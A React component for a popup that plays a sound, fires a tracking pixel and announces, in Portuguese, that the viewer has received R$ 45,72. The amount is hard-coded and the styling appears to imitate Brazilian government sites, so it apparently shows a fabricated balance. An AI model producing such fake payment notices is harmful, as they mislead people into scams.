import React, { useEffect } from 'react';
import { playNotificationSound } from '../utils/sound';
import { usePixelTracking } from '../hooks/usePixelTracking';

interface PopupProps {
  isOpen: boolean;
  onClose: () => void;
}

const Popup: React.FC<PopupProps> = ({ isOpen, onClose }) => {
  usePixelTracking();

  useEffect(() => {
    if (isOpen) {
      playNotificationSound();
      const timer = setTimeout(() => {
        onClose();
      }, 10000);

      return () => clearTimeout(timer);
    }
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50">
      <div className="fixed inset-0 bg-black bg-opacity-50" onClick={onClose}></div>
      <div className="bg-white rounded-lg p-6 shadow-xl relative z-10 max-w-sm w-full mx-4">
        <div className="text-center">
          <h3 className="text-lg font-semibold mb-2">SALDO ATUALIZADO</h3>
          <p className="text-sm text-gray-600 mb-1">Você Recebeu</p>
          <p className="text-3xl font-bold text-[#1351B4] mb-4">R$ 45,72</p>
          <button
            onClick={onClose}
            className="w-full bg-[#1351B4] text-white py-2 px-4 rounded-lg hover:bg-[#1351B4]/90 transition-colors"
          >
            Continuar
          </button>
        </div>
      </div>
    </div>
  );
};

export default Popup;